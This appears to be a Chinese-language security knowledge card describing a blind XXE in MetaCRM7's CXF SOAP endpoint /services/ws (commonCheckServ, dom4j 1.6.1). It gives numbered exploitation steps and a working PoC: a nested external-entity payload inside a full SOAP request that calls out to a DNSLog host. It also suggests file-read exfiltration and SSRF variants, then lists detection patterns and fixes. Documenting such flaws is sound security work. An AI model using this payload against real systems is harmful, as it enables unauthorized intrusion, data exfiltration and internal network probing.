---
id: web-generic-xxe-crm-cxf-soap-dom4j-nested-xml
title: MetaCRM /services/ws CXF SOAP 服务 commonCheckServ 嵌套 XML XXE（盲外带）
type: scenario
domain: web
path: web/generic/xxe
technique: crm-cxf-soap-dom4j-xxe
aliases:
- MetaCRM XXE
- CXFServlet XXE
- commonCheckServ XXE
- accessSessionValue XXE
- dom4j 1.6.1 XXE
- SOAP 嵌套 XML 实体
tags:
- java
- xxe
- dom4j
- cxf
- soap
- crm
- oob
- web
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V232
  verified_at: '2026-11-07T09:24:20+08:00'
  notes: 已对照原文与26张图核对：web.xml 注册 CXFServlet /services/*，/services/ 显示 ICommonOperationServ，端点 /services/ws，commonCheckServ 将 accessSessionValue 交 DocumentUtil.getDocument4String→dom4j 1.6.1 DocumentHelper.parseText；accessSessionValue 内嵌转义 XML 二次解析可发外部实体，DNSLog 收到 1.fr3zpmw.dnslog.pw 回连（图10-14），均一致；原文仅验证盲外带、未展示文件读取回显，卡内已如实标注。dup-scan 与 crm 系列卡均为 related（pair#26/30/35/41/42/48），不构成同链。affected_versions 原取自 classpath 测试环境版本，已 clear。未复跑 PoC。
---

## 一句话结论

MetaCRM7 的 `/services/ws` 由 CXFServlet 暴露 SOAP 服务，`commonCheckServ` 方法把请求中的 `accessSessionValue` 字符串交给 `DocumentUtil.getDocument4String`，后者用 dom4j 1.6.1 的 `DocumentHelper.parseText` 解析；攻击者把带外部 DTD/实体的 XML 作为文本嵌入 `accessSessionValue`，即可让服务端解析器发起外部请求，原文用 DNSLog 收到回连验证了盲 XXE。

## 原理

- **入口**：`web.xml` 注册 `org.apache.cxf.transport.servlet.CXFServlet` 并映射 `/services/*`；访问 `/services/` 可见 `ICommonOperationServ`，端点 `/services/ws`，命名空间 `http://data.service.ws.metasoft.com/`，方法包括 `commonCheckServ`、`commonNewServ`、`commonQueryServ` 等。
- **sink**：`com.metasoft.ws.service.data.CommonOperationServImpl.commonCheckServ(String accessSessionValue, String object, String recordId)` 调用 `DocumentUtil.getDocument4String(accessSessionValue)`；`DocumentUtil` 内部 `DocumentHelper.parseText(xml)`（dom4j 1.6.1）。
- **为什么可注入嵌套 XML**：SOAP 请求的 `accessSessionValue` 是普通字符串参数，攻击者可以在其中放一段完整 XML 文档（用 `&lt;` 或数字实体转义，避免破坏外层 SOAP XML）。服务端先解析 SOAP，再把字符串原样交给 dom4j 二次解析，第二层解析没有禁用 DOCTYPE/外部实体。
- **为什么能外带**：dom4j 1.6.1 的 `DocumentHelper.parseText` 默认使用未加固的 SAX 解析器，允许 `<!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker/"> %remote;]>`；解析器会请求外部 DTD/实体 URL，形成 DNS/HTTP 回连。原文在 `accessSessionValue` 中放入指向 `http://1.fr3zpmw.dnslog.pw` 的外部实体，DNSLog 收到记录。
- **危害**：盲 XXE 可用于把本地文件内容通过外部 DTD 拼进 URL 外带、发起内网 HTTP 请求（SSRF）、探测内网服务；若解析结果被业务返回/记录，也可能形成回显文件读取。原文确认了出网回连，未展示文件读取回显。
- **同服务的其他入口**：原文称 `commonNewServ`、`commonDeleteServ`、`commonUpdateServ`、`commonNewLineServ`、`commonQueryServ`、`commonNewDetailServ` 等方法也存在同类 XML 解析；同一服务的 `invokeUser` 还存在 `slogin` 字符串拼接 SQL 注入（见关联 SQLi 卡）。

## 触发条件

- 目标部署 MetaCRM7，CXFServlet `/services/*` 可从攻击面访问，`/services/ws` 端点存在。
- `commonCheckServ` 的 `accessSessionValue` 可控，且未被 CXF/业务层 XML 过滤器拦截。
- dom4j 版本/解析器未禁用 DOCTYPE 与外部实体（1.6.1 默认即不安全）。
- 服务端可出网（DNS/HTTP）或可访问内网目标，用于 OOB 验证/利用。
- 若目标有严格出网限制，盲 XXE 只能做内网 SSRF 或依赖回显路径。

## 利用步骤

1. 访问 `/services/` 或 `/services/ws?wsdl` 确认 CXF 服务与 `commonCheckServ` 方法存在。
2. 构造 SOAP 请求：`soapenv:Envelope` → `soapenv:Body` → `data:commonCheckServ`，其中 `accessSessionValue` 放入一段嵌套 XML。
3. 嵌套 XML 使用外部 DTD/实体指向攻击者 DNS/HTTP（例如 `http://<id>.dnslog.pw`）；外层 SOAP 中对 `<`、`>`、`"` 做转义或数字实体编码，保证外层 XML 合法。
4. 发送请求，观察 DNSLog/HTTP 日志是否收到回连；收到即确认 XXE。
5. 进一步利用：用外部 DTD 定义参数实体读取 `file:///...` 或内网 URL，把内容拼进回连子域/路径外带；或直接让解析器请求内网地址做 SSRF。
6. 按授权范围只读取无害文件/回连自控域名；不要对生产环境做破坏性请求。

## PoC

嵌套 XML（解码后）：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://1.example.dnslog.pw">
  %remote;
]>
<root/>
```

外层 SOAP 请求（`accessSessionValue` 内容按 XML 文本转义；原文使用数字实体编码）：

```http
POST /services/ws HTTP/1.1
Host: target
SOAPAction: 
Content-Type: text/xml;charset=UTF-8

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:data="http://data.service.ws.metasoft.com/">
  <soapenv:Header/>
  <soapenv:Body>
    <data:commonCheckServ>
      <accessSessionValue>&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM "http://1.example.dnslog.pw"&gt; %remote;]&gt;&lt;root/&gt;</accessSessionValue>
      <objectname>1</objectname>
      <recordid>1</recordid>
    </data:commonCheckServ>
  </soapenv:Body>
</soapenv:Envelope>
```

DNSLog 侧应出现 `1.example.dnslog.pw` 的 A/NS 查询记录；原文截图即为此回连证据。

## 变体与关联

- 变体：`file://` 读本地文件、`http://` 内网 SSRF、外部 DTD 参数实体 OOB 外带；其他 `common*Serv` 方法同样接收 XML 字符串。
- 变体：若业务把解析后的字段返回/写入日志，可尝试回显读取；无回显时坚持 OOB。
- 关联：[[web-generic-xxe-dom4j-parsemodxmlstr-inband-read]]（dom4j `DocumentHelper.parseText` 通用 XXE）、[[web-java-component-activeuc-gscheckuser-dom4j-xxe]]（另一个 dom4j XXE 产品入口）、[[web-generic-sqli-java-servlet-accountid-concat-boolean]]（同产品 `/headimgsave` SQLi）。
- 边界：仅确认 DNS 回连，未展示文件读取回显；若目标禁止出网、升级 dom4j 或全局禁用 DOCTYPE，则利用失败。

## 检测与防御

- 检测：SOAP 请求的 `accessSessionValue` 等参数含 `<!DOCTYPE`、`<!ENTITY`、`SYSTEM`、`http://`、`file://`；服务端出现异常外部 DNS/HTTP 请求；CXF 端点短时间内收到大量结构异常的 SOAP 请求。
- 修复：在 `DocumentUtil`/dom4j 层统一禁用 DOCTYPE 与外部实体（`SAXReader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`、关闭 external-general/parameter-entities）；升级 dom4j 到安全版本；对 XML 做结构白名单。
- 加固：CXF 端点统一鉴权与请求体大小/结构校验；WAF 拦截 DOCTYPE/ENTITY；限制应用出网；敏感文件最小权限。
